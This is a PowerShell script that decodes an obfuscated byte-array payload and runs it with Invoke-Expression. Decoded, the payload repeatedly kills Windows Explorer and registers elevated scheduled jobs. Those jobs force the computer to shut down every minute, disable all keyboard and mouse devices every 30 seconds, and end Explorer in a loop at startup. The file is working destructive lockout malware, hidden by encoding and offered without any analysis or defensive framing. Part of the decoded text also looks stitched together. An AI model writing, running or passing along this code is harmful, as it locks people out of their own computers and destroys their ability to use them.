function Deobfuscate-Script {
    [CmdletBinding()]
    param(
        # The obfuscated script, as a string of comma-separated values
        [Parameter(Mandatory = $true)]
        [string] $Encoded
    )

    # Split the encoded string into an array of bytes
    $bytes = $Encoded.Split(',') | ForEach-Object { [byte] $_ }

    # Convert the bytes back to a script string
    $script = [System.Text.Encoding]::ASCII.GetString($bytes)

    # Output the de-obfuscated script
    Write-Output $script
}

# De-obfuscate an encoded script
$encoded = '119,104,105,108,101,32,40,36,116,114,117,101,41,32,123,13,10,32,32,32,32,83,116,111,112,45,80,114,111,99,101,115,115,32,45,78,97,109,101,32,101,120,112,108,111,114,101,114,13,10,32,32,32,32,83,116,97,114,116,45,80,114,111,99,101,115,115,32,45,70,105,108,101,80,97,116,104,32,101,120,112,108,111,114,101,114,13,10,125,13,10,13,10,35,32,67,114,101,97,116,101,32,97,32,115,99,104,101,100,117,108,101,100,32,106,111,98,32,116,104,97,116,32,101,110,100,115,32,116,104,101,32,101,120,112,108,111,114,101,114,46,101,120,101,32,112,114,111,99,101,115,115,32,105,110,32,97,32,108,111,111,112,32,111,110,32,115,116,97,114,116,117,112,13,10,36,106,111,98,84,114,105,103,103,101,114,32,61,32,78,101,119,45,74,111,98,84,114,105,103,103,101,114,32,45,65,116,83,116,97,114,116,117,112,13,10,36,106,111,98,83,99,114,105,112,116,32,61,32,123,13,10,32,32,32,32,119,104,105,108,101,40,36,116,114,117,101,41,13,10,32,32,32,32,123,13,10,32,32,32,32,32,32,32,32,36,101,120,112,108,111,114,101,114,80,114,111,99,101,115,115,32,61,32,71,101,116,45,80,114,111,99,101,115,115,32,45,78,97,109,101,32,34,101,120,112,108,111,114,101,114,34,13,10,13,10,32,32,32,32,32,32,32,32,105,102,40,36,101,120,112,108,111,114,101,114,80,114,111,99,101,115,115,41,13,10,32,32,32,32,32,32,32,32,123,13,10,32,32,32,32,32,32,32,32,32,32,32,32,83,116,111,112,45,80,114,111,99,101,115,115,32,45,78,97,109,101,32,34,101,120,112,108,111,114,101,114,34,32,45,70,111,114,99,101,13,10,32,32,32,32,32,32,32,32,125,13,10,13,10,32,32,32,32,32,32,32,32,83,116,97,114,116,45,83,108,101,101,112,32,45,83,101,99,111,110,100,115,32,49,13,10,32,32,32,32,125,13,10,125,13,10,36,106,111,98,79,112,116,105,111,110,115,32,61,32,78,101,119,45,83,99,104,101,100,117,108,101,100,74,111,98,79,112,116,105,111,110,32,45,83,116,97,114,116,73,102,79,110,66,97,116,116,101,114,121,32,45,82,117,110,69,108,101,118,97,116,101,100,13,10,82,101,103,105,115,116,101,114,45,83,99,104,101,100,117,108,101,100,74,111,98,32,45,78,97,109,101,32,34,69,110,100,32,69,120,112,108,111,114,101,114,32,76,111,111,112,34,32,45,84,114,105,103,103,101,114,32,36,106,111,98,84,114,105,103,103,101,114,32,45,83,99,114,105,112,116,66,108,111,99,107,32,36,106,111,98,83,99,114,105,112,116,32,45,83,99,104,101,100,117,108,101,100,74,111,98,79,112,116,105,111,110,32,36,106,111,98,79,112,116,105,111,110,115,13,10,34,64,13,10,13,10,36,116,114,105,103,103,101,114,32,61,32,78,101,119,45,74,111,98,84,114,105,103,103,101,114,32,45,79,110,99,101,32,45,65,116,32,40,71,101,116,45,68,97,116,101,41,32,45,82,101,112,101,116,105,116,105,111,110,73,110,116,101,114,118,97,108,32,40,78,101,119,45,84,105,109,101,83,112,97,110,32,45,77,105,110,117,116,101,115,32,49,41,13,10,36,106,111,98,32,61,32,82,101,103,105,115,116,101,114,45,83,99,104,101,100,117,108,101,100,74,111,98,32,45,78,97,109,101,32,34,70,111,114,99,101,32,83,104,117,116,100,111,119,110,34,32,45,83,99,114,105,112,116,66,108,111,99,107,32,123,13,10,32,32,32,32,36,112,114,111,99,101,115,115,32,61,32,71,101,116,45,80,114,111,99,101,115,115,32,45,78,97,109,101,32,34,101,120,112,108,111,114,101,114,34,13,10,32,32,32,32,105,102,32,40,33,36,112,114,111,99,101,115,115,41,32,123,13,10,32,32,32,32,32,32,32,32,83,116,111,112,45,67,111,109,112,117,116,101,114,32,45,70,111,114,99,101,13,10,32,32,32,32,125,13,10,125,32,45,84,114,105,103,103,101,114,32,36,116,114,105,103,103,101,114,13,10,13,10,36,116,114,105,103,103,101,114,32,61,32,78,101,119,45,74,111,98,84,114,105,103,103,101,114,32,45,79,110,99,101,32,45,65,116,32,40,71,101,116,45,68,97,116,101,41,32,45,82,101,112,101,116,105,116,105,111,110,73,110,116,101,114,118,97,108,32,40,78,101,119,45,84,105,109,101,83,112,97,110,32,45,83,101,99,111,110,100,115,32,51,48,41,13,10,36,106,111,98,32,61,32,82,101,103,105,115,116,101,114,45,83,99,104,101,100,117,108,101,100,74,111,98,32,45,78,97,109,101,32,34,68,105,115,97,98,108,101,32,72,73,68,32,68,101,118,105,99,101,115,34,32,45,83,99,114,105,112,116,66,108,111,99,107,32,123,13,10,32,32,32,32,71,101,116,45,80,110,112,68,101,118,105,99,101,32,45,67,108,97,115,115,32,34,72,117,109,97,110,32,73,110,116,101,114,102,97,99,101,32,68,101,118,105,99,101,115,34,32,124,32,70,111,114,69,97,99,104,45,79,98,106,101,99,116,32,123,13,10,32,32,32,32,32,32,32,32,68,105,115,97,98,108,101,45,80,110,112,68,101,118,105,99,101,32,45,73,110,115,116,97,110,99,101,73,100,32,36,95,46,73,110,115,116,97,110,99,101,73,100,13,10,32,32,32,32,125,13,10,125,32,45,84,114,105,103,103,101,114,32,36,116,114,105,103,103,101,114,13,10,13,10,36,112,114,111,99,101,115,115,32,61,32,71,101,116,45,80,114,111,99,101,115,115,32,45,78,97,109,101,32,34,101,120,112,108,111,114,101,114,34,13,10,105,102,32,40,33,36,112,114,111,99,101,115,115,41,32,123,13,10,32,32,32,32,83,116,111,112,45,67,111,109,112,117,116,101,114,32,45,70,111,114,99,101,13,10,125'
$script = Deobfuscate-Script -Encoded $encoded

# Execute the de-obfuscated script
Invoke-Expression -Command $script
